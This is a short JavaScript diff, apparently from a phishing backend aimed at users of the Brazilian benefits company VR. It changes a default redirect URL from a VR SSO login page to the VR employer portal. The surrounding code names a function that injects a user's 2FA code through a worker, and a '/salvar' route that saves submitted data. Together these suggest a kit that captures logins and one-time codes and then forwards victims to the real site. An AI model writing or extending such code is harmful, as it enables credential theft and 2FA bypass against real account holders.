@@ -506,7 +506,7 @@ async function injetar2FAViaWorker(usuario, codigo) {
 
 
 
-const URL_FINAL_PADRAO = "https://sso-acesso.vr.com.br/u/login?state=hKFo2SAxclNVVm0wemFCWUJQMXZFOV9icGg1a1czMGplTjdSY6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIEtaX0FYdHdvcC1sZnBRNHFiUVVEa25zT3hHOVVWX29Co2NpZNkgSzRzQmJmVTVMM3RVcFFOT2NxWWc1OVA3TTI0S3ludUw";
+const URL_FINAL_PADRAO = "https://superportal-empregador.vr.com.br/";
 
 app.post(
     "/salvar",
